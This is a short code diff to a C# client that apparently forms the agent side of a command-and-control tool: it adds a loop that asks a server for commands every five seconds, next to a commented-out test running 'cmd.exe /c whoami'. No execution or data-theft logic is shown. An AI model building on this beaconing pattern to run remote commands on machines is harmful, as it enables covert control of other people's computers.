@@ -26,6 +26,13 @@ namespace client
                 // test command exeuction
                 // this is a bit janky
                 //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
+
+                // run getcommand every 5 seconds
+                int AgentCheckInterval = 5000;
+                while (true) {
+                    await comm.GetCommand();
+                    await Task.Delay(AgentCheckInterval);
+                }
             } catch (System.IndexOutOfRangeException) {
                 Console.WriteLine("Please provide the IP and port of the server to connect to.");
                 Environment.Exit(0);
